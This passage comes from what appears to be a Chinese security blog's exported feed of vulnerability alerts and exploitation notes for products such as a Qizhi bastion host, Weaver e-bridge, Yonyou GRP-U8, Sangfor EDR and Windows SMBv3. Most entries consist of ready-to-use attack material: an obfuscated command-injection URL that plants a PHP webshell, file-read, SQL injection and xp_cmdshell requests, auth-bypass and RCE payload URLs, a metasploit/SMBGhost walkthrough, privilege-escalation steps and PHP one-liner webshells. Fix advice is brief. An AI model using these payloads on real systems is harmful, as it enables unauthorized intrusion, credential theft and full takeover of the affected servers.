<p>该漏洞是PAN-OS上的一个缓冲区溢出漏洞，当启用了强制门户或配置了多重身份验证（MFA）时，未经身份验证的攻击者可通过向Captive Portal或Multi-Factor  Authentication接口发送恶意请求进行利用，可能导致系统进程中断，并允许使用root特权在PAN-OS设备上执行任意代码。</p>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>目前官方已针对此漏洞发布了更新版本，请受影响的用户尽快升级至安全版本进行防护，官方更新指南：</p>
<p><a href="https://docs.paloaltonetworks.com/pan-os/10-0/pan-os-admin/software-and-content-updates/pan-os-software-updates.html" target="_blank" rel="noopener">https://docs.paloaltonetworks.com/pan-os/10-0/pan-os-admin/software-and-content-updates/pan-os-software-updates.html</a></p>
<h2 id="齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）"><a href="#齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）" class="headerlink" title="齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）"></a>齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>无需登录</p>
<p>利用过程:</p>
<p>　　第一，<a href="http://10.20.10.11/listener/cluster_manage.php返回“OK”。" target="_blank" rel="noopener">http://10.20.10.11/listener/cluster_manage.php返回“OK”。</a></p>
<p>　　第二，执行以下链接即可getshell，执行成功后，生成PHP一句话马/var/www/shterm/resources/qrcode/lbj77.php密码10086。这里假设10.20.10.10为堡垒机的IP地址。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://10.20.10.10/ha_request.php?action=install&amp;ipaddr=10.20.10.11&amp;node_id=1$&#123;IFS&#125;|`echo$&#123;IFS&#125;"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64$&#123;IFS&#125;-d|bash`|$&#123;IFS&#125;|echo$&#123;IFS&#125;</span><br></pre></td></tr></table></figure>

<h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>　　$node_id的看起来应该是一个整数，所以只需在ha_request.php文件开头，添加以下一行代码，对该变量进行过滤即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">　$node_id = @intval($req_node_id);</span><br></pre></td></tr></table></figure>





<h2 id="泛微云桥任意文件读取漏洞"><a href="#泛微云桥任意文件读取漏洞" class="headerlink" title="泛微云桥任意文件读取漏洞"></a>泛微云桥任意文件读取漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>泛微云桥是一个为了满足用户提出的阿里钉钉与泛微OA集成需求,近日,泛微与阿里钉钉工程师多方联合,集合内部研发力量共同完成的“泛微云桥e-bridge平台”，近日泛微云桥被曝出存在任意文件读取漏洞。</p>
<h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><p>　　该漏洞几乎影响2018-2019全版本。</p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: curl/7.29.0</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br></pre></td></tr></table></figure>

<p><img src="0.png" alt="0"></p>
<p>将相应包中的id提交</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/file/fileNoLogin/xxxxxxxxxx</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: curl/7.29.0</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br></pre></td></tr></table></figure>

<p><img src="1.png" alt="1"></p>
<h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>去官网更新最新版本。</p>
<h2 id="网瑞达webVPN-RCE漏洞"><a href="#网瑞达webVPN-RCE漏洞" class="headerlink" title="网瑞达webVPN RCE漏洞"></a>网瑞达webVPN RCE漏洞</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>WebVPN是提供基于web的内网应用访问控制，允许授权用户访问只对内网开放的web应用，实现类似VPN（虚拟专用网）的功能。近日网瑞达的webVPN被曝出存在RCE的漏洞。</p>
<h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>去官网更新最新版本</p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>告警信息</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstudy默认配置nginx存在解析漏洞</title>
    <url>/2020/09/11/phpstudy%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AEnginx%E5%AD%98%E5%9C%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="告警信息"><a href="#告警信息" class="headerlink" title="告警信息"></a>告警信息</h2><p>2020年09月03日，国内安全团队监测发现 phpstudy 发布了phpstudy 安全配置错误漏洞的风险通告，该漏洞等级为高危；phpStudy 默认配置存在 nginx 解析漏洞。</p>
<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>由于 cgi.fix_pathinfo=1  使用默认配置，效果为当前目录下文件不存在，则采用上层路径；由于info.jpg文件，而后缀是jpg，php配置文件php-fpm.conf 中的 security.limit_extensions  参数值决定了jpg是否可以解析成php，而由于windows版本中没有此文件所以默认都可以解析为php，再加上php.ini参数cgi.fix_pathinfo使用默认配置，导致Windows下 phpstudy存在nginx解析漏洞。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>win：phpstudy : &lt;=8.1.0.7</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动phpstudy</p>
<p><img src="0.png" alt="0"></p>
<p>放个图片码到web目录</p>
<p><img src="1.png" alt="1"></p>
<p>蚂剑连接一句话木马成功。</p>
<p><img src="2.png" alt="2"></p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>更新到最新版</p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>天X信TopApp-LB 负载均衡系统sql注入</title>
    <url>/2020/09/11/%E5%A4%A9X%E4%BF%A1TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>天X信负载均衡系统TopApp为用户提高可靠的数据中心解决方案，包括单数据中心的链路负载均衡、服务器负载均衡解决方案，以及多数据中心的全局负载均衡解决方案。TopApp集成了压缩、缓存、SSL卸载等网络优化技术来加速业务系统交付的整个过程，提升业务系统处理效率；同时结合Web应用防火墙、DNS防火墙、DDOS攻击防护及漏洞扫描等技术手段形成全方位的网络安全防护，为用户业务系统的安全保驾护航。</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/acc/clsf/report/datasource.php</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="attribute">Host:</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept</span>: text/javascript, text/html, application/xml, text/xml, */*</span><br><span class="line"></span><br><span class="line"><span class="attribute">X-Prototype-Version</span>: 1.6.0.3</span><br><span class="line"></span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"></span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: same-origin</span><br><span class="line"></span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: cors</span><br><span class="line"></span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: empty</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Length</span>: 201</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">t=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=@ ......</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>用友GRP-u8 XXE注入</title>
    <url>/2020/09/11/%E7%94%A8%E5%8F%8BGRP-u8%20XXE%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Proxy</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept</span>: Accept: */*</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/4.0 (compatible; MSIE 6.0;)</span><br><span class="line"></span><br><span class="line"><span class="attribute">Host</span>: host</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Length</span>: 357</span><br><span class="line"></span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br><span class="line"></span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">cVer=9.8.0&amp;dp=&lt;?xml version="1.0" encoding="GB2312"?&gt;&lt;R9PACKET version="1"&gt;&lt;DATAFORMAT&gt;XML&lt;/DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;/NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;/NAME&gt;&lt;DATA format="text"&gt;DataSetProviderData&lt;/DATA&gt;&lt;/PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;/NAME&gt;&lt;DATA format="text"&gt;exec xp_cmdshell 'net user'&lt;/DATA&gt;&lt;/PARAM&gt;&lt;/PARAMS&gt;&lt;/R9FUNCTION&gt;&lt;/R9PACKET&gt;</span><br></pre></td></tr></table></figure>

<p><img src="0.png" alt="0"></p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>绿盟UTS综合威胁探针管理员任意登录</title>
    <url>/2020/09/11/%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>绿盟全流量威胁分析解决方案针对原始流量进行采集和监控，对流量信息进行深度还原、存储、查询和分析，可以及时掌握重要信息系统相关网络安全威胁风险，及时检测漏洞、病毒木马、网络攻击情况，及时发现网络安全事件线索，及时通报预警重大网络安全威胁，调查、防范和打击网络攻击等恶意行为，保障重要信息系统的网络安全。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>V2.0R00F02SP02及之前版本</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><img src="0.png" alt="0"></p>
<p><img src="1.png" alt="1"></p>
<p>释放请求包，对响应包进行修改，将false更改为true</p>
<p><img src="2.png" alt="2"></p>
<p><img src="3.png" alt="3"></p>
<p>可以看到相应包回显了密码md5后的密文</p>
<p><img src="4.png" alt="4"></p>
<p>将此md5替换登录的请求包，成功登录</p>
<p><img src="5.png" alt="5"></p>
<p><img src="6.png" alt="6"></p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="http://update.nsfocus.com/update/listBsaUtsDetail/v/F02" target="_blank" rel="noopener">http://update.nsfocus.com/update/listBsaUtsDetail/v/F02</a></p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>宝塔数据库未授权访问漏洞</title>
    <url>/2020/08/23/%E5%AE%9D%E5%A1%94%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>宝塔面板是提升运维效率的服务器管理软件，支持一键LAMP/LNMP/集群/监控/网站/FTP/数据库/JAVA等100多项服务器管理功能。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Linux版本 7.4.2版本</p>
<p>Linux测试版本 7.5.14版本</p>
<p>Windows版 6.8版本</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>环境部署了phpmyadmin</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>payload ： <a href="http://ip:888/pma/" target="_blank" rel="noopener">http://ip:888/pma/</a></p>
<p><img src="0.png" alt="0"></p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>升级宝塔面板至最新版本 </p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>告警信息</tag>
      </tags>
  </entry>
  <entry>
    <title>深x服EDR终端检测平台存在任意用户登录漏洞</title>
    <url>/2020/08/20/%E6%B7%B1x%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次测试版本为3.2.15，网上已知最高可打3.2.19，其他版本自行测试。</p>
<p>注：禁止非授权入侵</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>payload: <a href="https://ip/ui/login.php?user=arbitrarily" target="_blank" rel="noopener">https://ip/ui/login.php?user=arbitrarily</a></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><img src="0.png" alt="0"></p>
<p>利用payload进行任意登录</p>
<p><img src="1.png" alt="1"></p>
<h2 id="整改建议"><a href="#整改建议" class="headerlink" title="整改建议"></a>整改建议</h2><p>及时进行更新，关注官网补丁信息。</p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA任意文件删除实现getshell</title>
    <url>/2020/08/19/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E5%AE%9E%E7%8E%B0getshell/</url>
    <content><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>​         通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。     </p>
<p>通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。     </p>
<p>此外，通达OA通过融合不同的信息化资源，打通信息“孤岛”，精细化流程管理，改善管理模式，实现资源的优化配置和高效运转，全面提升企业竞争力。它是通达信科在二十余年从事管理软件研发和服务过程中集技术创新、项目实践、先进的管理思想和中肯的客户建议为一体的完美结晶。     </p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本地搭建通达OA环境，本次试验使用版本为11.6（其余版本自行测试）</p>
<p><img src="0.png" alt="0"></p>
<p>使用exp脚本进行getshell</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 tongdaOA_rce.py http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">133</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p><img src="1.png" alt="1"></p>
<p>成功上传一句话，连接webshell</p>
<p><img src="2.png" alt="2"></p>
<p>注：此漏洞利用会导致删除inc文件夹下的auth.inc.php，从而导致系统无法正常使用，禁止进行未授权测试。</p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>深x服EDR v3.2.21 (20200703)源码泄露</title>
    <url>/2020/08/19/%E6%B7%B1x%E6%9C%8DEDR%20v3.2.21%20(20200703)%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h2 id="告警信息"><a href="#告警信息" class="headerlink" title="告警信息"></a>告警信息</h2><p>解决之前版本的远程任意代码注入漏洞，深x服EDR 更新到3.2.21 版本</p>
<p>更新文献：<a href="https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined" target="_blank" rel="noopener">https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined</a></p>
<p>早期可能误传导致源码泄露（现阶段官网社区已经删除）</p>
<p><img src="0.png" alt="0"></p>
<p>由于特殊时期，具体详情暂不描述</p>
<h2 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h2><p>源码泄露能被恶意攻击者进行代码审计分析，从而挖掘出新的漏洞，达到入侵目的。</p>
<h2 id="HW期间建议"><a href="#HW期间建议" class="headerlink" title="HW期间建议"></a>HW期间建议</h2><p>1.对EDR管理平台做acl策略，限制ip；</p>
<p>2.暂时下线</p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>告警信息</tag>
      </tags>
  </entry>
  <entry>
    <title>深x服EDR终端检测平台RCE漏洞</title>
    <url>/2020/08/17/%E6%B7%B1x%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>深x服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。 </p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PAYLOAD：/tool/log/c.php?strip_slashes=system&amp;host=pwd</span><br></pre></td></tr></table></figure>

<p><img src="0.png" alt="0"></p>
<p><img src="1.png" alt="1"></p>
<h2 id="整改建议"><a href="#整改建议" class="headerlink" title="整改建议"></a>整改建议</h2><p>现阶段深x服终端检测响应平台EDR出现多处漏洞，官方暂未提供相关补丁更新，建议暂时下线此平台系统，等待后续更新修复漏洞后再上线。</p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>cve-2020-0787-Windows提权</title>
    <url>/2020/06/22/cve-2020-0787-Windows%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>Windows Background Intelligent Transfer Service 权限提升漏洞</strong></p>
<p>当Windows Background Intelligent Transfer Service  (BITS)未能正确地处理符号链接时，存在权限提升漏洞。成功利用此漏洞的攻击者可以覆盖导致提升状态的目标文件。要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行巧尽心思构建的应用程序，利用此漏洞并控制受影响的系统。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 10，Server 2016，Server 2019，Server version 1803，Server version 1903，Server version 1909，Windows 8.1，Server 2012，Server 2012 R2</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><img src="0.png" alt="0"></p>
<p><img src="1.png" alt="1"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>安装python-ldap模块过坑</title>
    <url>/2020/06/19/%E5%AE%89%E8%A3%85python%E6%A8%A1%E5%9D%97%E8%BF%87%E5%9D%91/</url>
    <content><![CDATA[<h2 id="Linux安装python-ldap"><a href="#Linux安装python-ldap" class="headerlink" title="Linux安装python-ldap"></a>Linux安装python-ldap</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libsasl2-dev python-dev libldap2-dev libssl-dev</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pip3 install python-ldap</span><br></pre></td></tr></table></figure>



<h2 id="Windows安装python-ldap"><a href="#Windows安装python-ldap" class="headerlink" title="Windows安装python-ldap"></a>Windows安装python-ldap</h2><p>安装 whl 包：<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap" target="_blank" rel="noopener">https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap</a></p>
<p><img src="0.png" alt="0"></p>
<p>下载相对应的whl包，再安装即可</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip3 install pyldap-<span class="number">2</span>.<span class="number">4</span>.<span class="number">45</span>-cp37-cp37m-win_amd64.whl</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>遇坑笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>永恒之黑(cve-2020-0796)配合msf获取shell</title>
    <url>/2020/06/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91(cve-2020-0796)%E9%85%8D%E5%90%88msf%E8%8E%B7%E5%8F%96shell/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>   今天看到tools上的cve-2020-0796复现文章，就此自己搭建一下环境复现，做一下笔记</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 10 Version 1903， Windows Server Version 1903(Server Core  installation)，Windows 10 Version 1909， 和Windows Server Version  1909(Server Core installation)受到这个漏洞的影响。不过值得注意的是，引入SMBv3的Windows  8和Windows Server 2012也有可能受到影响。</p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>GitHub上Fork过来的</p>
<p><a href="https://github.com/YGnight/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/YGnight/SMBGhost_RCE_PoC</a></p>
<p>kali集成</p>
<p>metasploit ：开源安全漏洞检测工具；</p>
<p>msfvenom ：metasploit的标准payload生成器</p>
<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>使用msfvenom生成直连exploit</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=<span class="number">1314</span> -f py -o cve<span class="number">-2020</span><span class="number">-0796.</span>py</span><br></pre></td></tr></table></figure>



<p><img src="0.png" alt="0"></p>
<p>将生成的与脚本exploit.py里user_payload进行替换</p>
<p><img src="1.png" alt="1"></p>
<p>使用python3运行exploit （版本不要过高，本地复现使用的python3.7.4）</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">exploit</span><span class="selector-class">.py</span> <span class="selector-tag">-ip</span> 192<span class="selector-class">.168</span><span class="selector-class">.168</span><span class="selector-class">.130</span></span><br></pre></td></tr></table></figure>



<p><img src="3.png" alt="3"></p>
<p>运行metasploit </p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload /windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">1314</span></span><br></pre></td></tr></table></figure>



<p><img src="4.png" alt="4"></p>
<p>指定目标机，run</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">130</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="5.png" alt="5"></p>
<p>得到shell</p>
<p><img src="6.png" alt="6"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>pipePotato-新型通用提权</title>
    <url>/2020/05/08/pipePotato-%E6%96%B0%E5%9E%8B%E9%80%9A%E7%94%A8%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>本地提权，对于任意windows Server 2012以上的windows  server版本(win8以上的某些windows版本也行)，从Service用户提到System 用户，在</p>
<p>windows Server  2012，</p>
<p>windows Server 2016，</p>
<p>windows Server 2019</p>
<p>全补丁的情况都测试成功了。</p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>GitHub上有源码，自行编译即可</p>
<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><p>cmd运行 </p>
<pre><code>whoami               #查看权限</code></pre><p><img src="0.png" alt="0"></p>
<pre><code>whoami /priv         #查看是否具有SeImpersonatePrivilege权限</code></pre><p><img src="1.png" alt="1"></p>
<pre><code>PrintSpoofer.exe -i -c &quot;whoami&quot;      #查看权限是否提升为system</code></pre><p><img src="2.png" alt="2"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码执行函数</title>
    <url>/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="1、eval-函数"><a href="#1、eval-函数" class="headerlink" title="1、eval()函数"></a>1、eval()函数</h2><pre><code>#eval() 函数把字符串按照 PHP 代码来计算
#常见一句话：
&lt;?php @eval($_POST[&apos;YGnight&apos;]);?&gt;</code></pre><h2 id="2、assert-函数"><a href="#2、assert-函数" class="headerlink" title="2、assert()函数"></a>2、assert()函数</h2><pre><code>#与eval类似
#常见一句话
&lt;?php @assert($_POST[&apos;YGnight&apos;])?&gt;</code></pre><h2 id="3、array-map-函数"><a href="#3、array-map-函数" class="headerlink" title="3、array_map()函数"></a>3、array_map()函数</h2><pre><code>#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。
#命令执行http://localhost/123.php?func=system   cmd=whoami
#菜刀连接http://localhost/123.php?func=assert   密码：cmd
$func=$_GET[&apos;func&apos;];
$cmd=$_POST[&apos;cmd&apos;];
$array[0]=$cmd;
$new_array=array_map($func,$array);
echo $new_array;</code></pre><h2 id="4、create-function-函数"><a href="#4、create-function-函数" class="headerlink" title="4、create_function()函数"></a>4、create_function()函数</h2><pre><code>#创建匿名函数
#执行命令和上传文件参考eval函数(必须加分号)。
#菜刀连接密码：cmd
